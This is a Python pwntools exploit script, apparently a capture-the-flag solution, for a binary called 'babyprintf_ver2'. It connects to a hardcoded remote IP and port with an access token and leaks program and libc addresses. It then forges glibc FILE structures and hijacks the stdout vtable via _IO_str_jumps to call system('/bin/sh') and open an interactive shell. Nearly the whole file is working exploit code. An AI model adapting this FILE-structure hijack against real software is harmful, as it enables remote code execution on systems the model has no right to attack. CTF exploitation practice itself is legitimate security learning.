#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./babyprintf_ver2"
elf=ELF(pwn_file)
libc = ELF("./bc.so.6")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("150.109.46.159",20005)
    r.sendlineafter("token:","YCMcAG60fpTxa0MUv5xwLQ6sEIYjS3tJ")
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def leak(payload,ends = None):
    r.sendline(payload)
    if ends == None:
        return r.recv()
    else:
        return r.recvuntil(ends)

r.recvuntil("location to ")
elf.address=int(r.recvline(),16)-0x202010
r.recvuntil("Have fun!\n")
base=0x202010+elf.address
jmp_table=0x202130+elf.address
stdout=base+0x30
flag=0xfbad3c80

def file_ptr(flag=0,read_ptr=0,read_end=0,read_base=0,write_base=0,write_ptr=0,write_end=0,buf_base=0,buf_end=0):
    return p64(flag)+p64(read_ptr)+p64(read_end)+p64(read_base)+\
            p64(write_base)+p64(write_ptr)+p64(write_end)+\
            p64(buf_base)+p64(buf_end)

payload = file_ptr(flag=flag,write_base = stdout, write_ptr = stdout +0xe0,write_end = stdout + 0xe0).ljust(0x70,"\x00")+p64(1)+p64(0xffffffffffffffff)+p64(0x0000000000000000)+p64(0x202640+elf.address)
f={
    0:"a".ljust(0x10,"\x00")+p64(stdout),
    stdout - base : payload
}
libc.address = u64(leak(fit(f,filler="\x00"),ends = "\x7f")[-6:].ljust(8,"\x00"))-0x3ac2a0 - 0x3c000
def pack_file(_flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0):
    struct = p32(_flags) + \
    p32(0) + \
    p64(_IO_read_ptr) + \
    p64(_IO_read_end) + \
    p64(_IO_read_base) + \
    p64(_IO_write_base) + \
    p64(_IO_write_ptr) + \
    p64(_IO_write_end) + \
    p64(_IO_buf_base) + \
    p64(_IO_buf_end) + \
    p64(_IO_save_base) + \
    p64(_IO_backup_base) + \
    p64(_IO_save_end) + \
    p64(_IO_marker) + \
    p64(_IO_chain) + \
    p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct
fake_vtable_addr = libc.address + 0x3e8360 - 0x20
#fake_vtable_addr = libc.sym["_IO_str_jumps"] - 0x20
f={
    0:p64(fake_vtable_addr),
    0x10:p64(stdout),
    stdout-base : pack_file(_flags = flag,
        _IO_write_base = stdout + 0xd8,
        _IO_write_ptr = stdout + 0xd8,
        _IO_write_end = stdout + 0xd8+0x20,
        _fileno = 1,
        _lock = elf.address + 0x202a60
        )
}

leak(fit(f,filler="\x00"))

rdi = next(libc.search("/bin/sh"))

file_struct = pack_file(
_flags = flag,
_IO_buf_end = (rdi-100)/2,
_IO_write_ptr = (rdi-100)/2,
_IO_write_base = 0,
_lock = elf.address+0x202640,
    ) + p64(fake_vtable_addr)+ p64(libc.sym["system"])

f={
    0:"a"*0x10+p64(stdout),
    stdout-base:file_struct
}

leak(fit(f,filler="\x00"))


r.interactive()



